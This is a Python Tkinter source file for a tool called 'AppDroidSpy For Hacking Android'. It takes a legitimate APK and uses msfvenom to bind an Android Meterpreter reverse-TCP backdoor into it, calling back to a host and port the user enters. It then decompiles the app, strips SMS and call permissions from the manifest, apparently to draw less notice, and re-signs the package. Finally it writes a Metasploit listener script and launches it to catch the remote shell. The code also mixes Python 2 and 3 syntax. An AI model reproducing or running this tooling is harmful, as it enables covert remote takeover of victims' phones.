#!usr/bin/python

from tkinter import filedialog

from tkinter import *

import subprocess as sp

from tkinter import messagebox, ttk

import re

import os

import time

try:

    import psutil

except ImportError, e:

    m=messagebox.showwarning(title=None,message="<psutil> is not install press ok to install")

    if m =="ok":

        os.system("pip install psutil")

    

try:

    import shutil

except ImportError, e:

    m=messagebox.showwarning(title=None,message="<shutil> is not install press ok to install")

    if m =="ok":

        os.system("pip install shutil")

try:

    import threading

except ImportError, e:

    m=messagebox.showwarning(title=None,message="<threading> is not install press ok to install")

    if m =="ok":

        os.system("pip install threading")

tk = Tk()

tk.title("AppDroidSpy For Hacking Android")

tk.geometry("620x600")

tk.resizable(width=False, height=False)

frame0 = Frame(tk)

frame0.pack()

style = ttk.Style()

style.theme_use("clam")

style.configure("TButton", background="black", foreground="red")

frame1 = ttk.Frame(tk)

frame1.pack()

frame2 = ttk.Frame(tk)

frame2.pack()

frame3 = ttk.Frame(tk)

frame3.pack()

btn_frame = Frame(tk)

btn_frame.pack()

label2 = ttk.Label(tk)

label = ttk.Label(tk)

label3 = ttk.Label(tk)

# choise a file

def running(name):

    for pid in psutil.pids():

        try:

            p = psutil.Process(pid)

            if len(p.cmdline()) > 1:

                if name in p.cmdline()[1]:

                    return True

        except:

            None

    return False

def asksavedir():

    try:

        file = filedialog.askdirectory()

        txtdir = open('diresave.txt', 'w')

        txtdir.write(file)

        txtdir.close()

    except:

        pass

txtdir = open('dire.txt', "w")

def filedyl():

    global label3

    try:

        label3.destroy()

        file = filedialog.askopenfilename(initialdir='/root/Desktop/', title='select a file',

                                          filetypes=(("apk files", "*.apk"), ("all files", "*.*")))

        apkdir = open('dire.txt', 'w')

        apkdir.write(file)

        apkdir.close()

        txt = open("dire.txt", "r")

        label3 = Label(frame1, text=txt.read(), font=(b'bold italic', 14), fg='red')

        label3.pack()

    except:

        pass

def validate(P):

    test = re.compile('(^\d{0,3}$|^\d{1,3}\.\d{0,3}$|^\d{1,3}\.\d{1,3}\.\d{0,3}$|^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{0,3}$)')

    if test.match(P):

        return True

    else:

        return False

def validate_input(value):

    test = re.compile('(^\d{0,3}$|^\d{1,3}\\d{0,3}$)')

    if test.match(value):

        return True

    else:

        return False

def waittime():

    labeltime = Label(frame1, fg="red", font=('arial', 80, 'normal'))

    lbl = Label(frame1, text="The metasploit is run please wait :", font=('bold', 20))

    lbl.pack()

    labeltime.pack()

    txt = xrange(int(time.time()))

    for i in txt:

        labeltime["text"] = txt[i]

        time.sleep(1)

        tk.update()

        if not running("msfvenom"):

            break

    labeltime.destroy()

    lbl.destroy()

def waittime2():

    labeltime = Label(frame1, fg="red", font=('arial', 80, 'normal'))

    lbl = Label(frame1, text="apktool is run please wait ", font=('bold', 20))

    lbl.pack()

    labeltime.pack()

    txt = xrange(0, 30)

    for i in txt:

        labeltime["text"] = txt[i]

        time.sleep(1)

        tk.update()

    labeltime.destroy()

    lbl.destroy()

def waittime3():

    labeltime = Label(frame1, fg="red", font=('arial', 80, 'normal'))

    lbl = Label(frame1, text="apktool is run please wait ", font=('bold', 20))

    lbl.pack()

    labeltime.pack()

    txt = xrange(0, 30)

    for i in txt:

        labeltime["text"] = txt[i]

        time.sleep(1)

        tk.update()

    labeltime.destroy()

    lbl.destroy()

hostmsg2 = Label(frame2,

                 text='                                                                                                      ',

                 font=(b'bold', 10), fg='red')

hostmsg2.grid(row=0, column=2)

varip = StringVar()

vcmd = tk.register(validate)

host = Entry(frame3, textvariable=varip, validate='key', validatecommand=(vcmd, '%P'))

host.grid(row=0, column=0)

pop = StringVar()

validate = tk.register(validate_input)

port = Entry(frame3, textvariable=pop, validate="key", validatecommand=(validate, "%P"))

port.grid(row=0, column=3)

porttmsg2 = Label(frame3, text='                                       ', font=(b'bold', 10), fg='red')

porttmsg2.grid(row=0, column=2)

hostmsg = Label(frame3, text='enter the host                 ', font=(b'bold', 10), fg='red')

hostmsg.grid(row=1, column=0)

portmsg = Label(frame3, text='                enter the port', font=(b'bold', 10), fg='red')

portmsg.grid(row=1, column=3)

spacelabel = Label(frame3, text='                              ', font=(b'bold', 10), fg='red')

spacelabel.grid(row=1, column=1)

fakelabel = ttk.Label(btn_frame, text='<<<<', font=(b'bold', 10))

fakelabel.grid(row=1, column=2)

fakelabel2 = ttk.Label(btn_frame, text='>>>>', font=(b'bold', 10))

fakelabel2.grid(row=1, column=4)

termf = Frame(tk)

termf.pack(fill=BOTH, expand=YES)

wid1 = termf.winfo_id()

os.system(

    "xterm -into %d -geometry 103x50 -fg 'red' -hold -e 'figlet AppDroidSpy      .............BY............   Brahim Khali' &" % wid1)

termf2 = Frame(tk)

termf.pack(fill=BOTH, expand=YES)

wid = termf.winfo_id()

# =================================================BUTTONS==================================================================

btn_apk = ttk.Button(frame0, text='choise apk', command=lambda: filedyl())

btn_apk.pack()

btn_restePort = ttk.Button(frame2, text="  reset  ", command=lambda: resetPort())

btn_restePort.grid(row=0, column=0)

btn_resthost = ttk.Button(frame2, text="  reset  ", command=lambda: resetHost())

btn_resthost.grid(row=0, column=3)

btn_run = ttk.Button(btn_frame, text="    run    ", command=lambda: run())

btn_run.grid(row=1, column=3)

btn_reset = ttk.Button(btn_frame, text=" reset all  ", command=lambda: resetAll())

btn_reset.grid(row=1, column=5)

btn_exit = ttk.Button(btn_frame, text="   Exit   ", command=lambda: Exit())

btn_exit.grid(row=1, column=1)

def Exit():

    try:

        close()

        isn = os.path.isfile("diresave.txt")

        if isn == True:

            delete2file()

        else:

            os.remove("dire.txt")

    except:

        pass

def close():

    tk.destroy()

def delete2file():

    os.remove("diresave.txt")

    os.remove("dire.txt")

def getip(event):

    global label2

    global host

    label2.destroy()

    port.focus_set()

    host.config(state=DISABLED)

def getport(event):

    global label

    global port

    label.destroy()

    host.focus_get()

    port.config(state=DISABLED)

def resetPort():

    host.config(state=NORMAL)

    host.delete(0, END)

def resetHost():

    port.config(state=NORMAL)

    port.delete(0, END)

def resetAll():

    global label3

    label.destroy()

    global label2

    label2.destroy()

    global label3

    label3.destroy()

    port.config(state=NORMAL)

    host.config(state=NORMAL)

    btn_run.config(state=NORMAL)

    host.delete(0, END)

    port.delete(0, END)

def run():

    asksavedir()

    askdir = open('diresave.txt', 'r')

    askdire = askdir.read()

    btn_reset.config(state=DISABLED)

    btn_run.config(state=DISABLED)

    host_v = host.get()

    port_v = port.get()

    txt = open("dire.txt", "r")

    apk = txt.read()

    def proc():

        payload = "msfvenom -x {} -p android/meterpreter/reverse_tcp LHOST={} LPORT={} R> {}/payload.apk".format(apk,

                                                                                                                 host_v,

                                                                                                                 port_v,

                                                                                                                 askdire)

        os.popen("xterm -into %d -fg 'red' -e '{}' &".format(payload) % wid)

        print(payload)

    # ======================================================================================================================

    def apktooldecompile():

        apktoolD = "apktool d -f {}/payload.apk -o {}/payload".format(askdire, askdire)

        os.popen("xterm -into %d -fg 'red' -e '{}' &".format(apktoolD) % wid)

        print(apktoolD)

    # ======================================================================================================================

    def apktoolB():

        apkto = "apktool b {}/payload".format(askdire)

        os.system("xterm -into %d -e '{}' &".format(apkto) % wid)

        print(apkto)

    # ======================================================================================================================

    def d2j_apk():

        d2j = "d2j-apk-sign {}/payload/dist/payload.apk/ -o {}/new_payload.apk ".format(askdire, askdire)

        os.system("xterm -into %d -e '{}' &".format(d2j) % wid)

        print(d2j)

    # ======================================================================================================================

    def moveApkToDesktop():

        shutil.rmtree('{}/payload/'.format(askdire))

        os.remove('{}/payload.apk'.format(askdire))

        messagebox.showinfo("the payload is ready   ", " the payload is in {} ".format(askdire))

    # ======================================================================================================================

    def deletemain():

        infile = r"{}/payload/AndroidManifest.xml".format(askdire)

        outfile = r"{}/file.txt".format(askdire)

        delete_list = ['<uses-permission android:name="android.permission.SEND_SMS"/>',

                       '<uses-permission android:name="android.permission.CALL_PHONE"/>']

        fin = open(infile, "r")

        fout = open(outfile, "w+")

        for line in fin:

            for word in delete_list:

                line = line.replace(word, "")

            fout.write(line)

        fin.close()

        fout.close()

        os.remove("{}/payload/AndroidManifest.xml".format(askdire))

        newfile = "{}/file.txt".format(askdire)

        os.rename(newfile, "{}/payload/AndroidManifest.xml".format(askdire))

    # ======================================================================================================================

    def multi_handler():

        option = "use multi/handler\n"

        option += 'set payload android/meterpreter/reverse_tcp\n'

        option += "set LHOST {} \nset LPORT {}\n".format(host_v, port_v)

        option += "exploit\n"

        filewrite = open("{}/listener.rc".format(askdire), 'w')

        filewrite.write(option)

        filewrite.close()

        openmeta = "msfconsole -r {}/listener.rc".format(askdire)

        sp.Popen(['xterm', '-e', ' bash -c \"{}; exec bash\"'.format(openmeta)]).wait()

        os.remove('{}/listener.rc'.format(askdire))

    # ======================================================================================================================

    msg = messagebox.askquestion("the payload is generate now ", "are you sure ")

    if msg == "yes":

        with open('diresave.txt') as checkfile:

            empty = checkfile.read(1)

            if not empty:

                btn_run.config(state=NORMAL)

                btn_reset.config(state=NORMAL)

                pass

            else:

                with open('dire.txt') as checkfile:

                    empty = checkfile.read(1)

                    if not empty:

                        messagebox.showwarning("no apk found", "you have choise apk ")

                        btn_run.config(state=NORMAL)

                        btn_reset.config(state=NORMAL)

                        pass

                    if host_v == "":

                        messagebox.showwarning("host not found", "you have enter the host ")

                        btn_run.config(state=NORMAL)

                        btn_reset.config(state=NORMAL)

                        pass

                    if port_v == "":

                        messagebox.showwarning("port not found", "you have enter the port ")

                        btn_run.config(state=NORMAL)

                        btn_reset.config(state=NORMAL)

                        pass

                    else:

                        proc()

                        time.sleep(2)

                        waittime()

                        apktooldecompile()

                        waittime2()

                        deletemain()

                        time.sleep(1.5)

                        apktoolB()

                        waittime3()

                        d2j_apk()

                        time.sleep(3)

                        moveApkToDesktop()

                        msg4 = messagebox.askquestion("the payload is finish", "do you want to run metasploit now ?")

                        if msg4 == "yes":

                            Exit()

                            multi_handler()

                        else:

                            msg5 = messagebox.askquestion("is done ", "do you want to exit from the program")

                            if msg5 == "yes":

                                Exit()

                            else:

                                btn_reset.config(state=NORMAL)

                                btn_run.config(state=NORMAL)

                                delete2file()

                                pass

    else:

        msg2 = messagebox.askquestion("try again ", "do you want to delete all your entry ")

        if msg2 == "yes":

            delete2file()

            resetAll()

        else:

            btn_run.config(state=NORMAL)

            btn_reset.config(state=NORMAL)

            pass

host.bind("<Return>", getip)

port.bind("<Return>", getport)

def coloseProgram():

    msg6 = messagebox.askquestion("Exit ", "do you want to exit ")

    if msg6 == "yes":

        Exit()

    else:

        pass

tk.protocol("WM_DELETE_WINDOW", coloseProgram)

tk.mainloop()

